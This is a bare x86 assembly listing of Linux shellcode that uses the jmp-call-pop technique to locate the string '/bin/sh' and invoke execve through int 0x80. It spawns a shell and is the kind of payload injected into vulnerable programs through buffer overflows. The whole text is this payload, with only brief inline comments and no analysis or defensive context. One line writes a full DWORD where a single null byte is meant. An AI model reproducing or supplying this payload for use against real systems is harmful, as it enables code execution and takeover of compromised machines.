JMP _WANT_BIN_BASH

_GOT_BIN_BASH:
    POP EBX                     # EBX = "/bin/sh@"
    XOR EAX, EAX                # EAX = 0
    MOV DWORD PTR [EBX+7], EAX  #overwrite @ with zero
    ADD EAX,0x0B                # 11 - code for execve
    XOR ECX, ECX
    XOR EDX, EDX
    INT 0x80

_WANT_BIN_BASH:
    CALL _GOT_BIN_BASH
    .ASCII "/bin/sh@"
